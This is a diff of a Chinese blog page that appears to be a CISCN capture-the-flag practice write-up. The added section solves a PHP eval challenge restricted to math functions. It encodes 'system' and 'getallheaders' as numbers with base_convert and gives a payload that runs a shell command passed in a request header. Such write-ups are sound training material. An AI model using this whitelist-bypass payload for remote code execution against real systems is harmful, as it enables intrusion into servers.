@@ -246,7 +246,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/%E5%88%B7%E9%A2%98/" style="color: #ffa2c4">刷题</a>
+                <a href="/blog/tags/%E5%88%B7%E9%A2%98/" style="color: #00a596">刷题</a>
             </span>
             
         </span>
@@ -260,7 +260,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">548字</span>
+        <span class="post-count">618字</span>
       </span>
     </span>
 
@@ -361,7 +361,21 @@ i <span class="token operator">=</span> <span class="token number">0</span>
     <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo '</span><span class="token operator">.</span><span class="token variable">$content</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>数字与字符串的转换原理参考我的博客即可</p>
+<p>这里是白名单过滤，只能用数学函数</p>
+<p>数字与字符串的转换原理参考我的rce博客即可</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">echo</span> <span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'getallheaders'</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>用<code>getallheaders()&#123;1&#125;</code>函数进行参数带外到请求头，进行任意命令执行</p>
+<p>payload：</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http">?c=base_convert(1751504350,10,36)(base_convert(8768397090111664438,10,30)()&#123;1&#125;)
+
+<span class="token header"><span class="token header-name keyword">1</span><span class="token punctuation">:</span><span class="token header-value">ls /</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/05/05/CISCN%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20231020145512230.png" alt="image-20231020145512230"></p>
+<hr>
 
     </div>
     
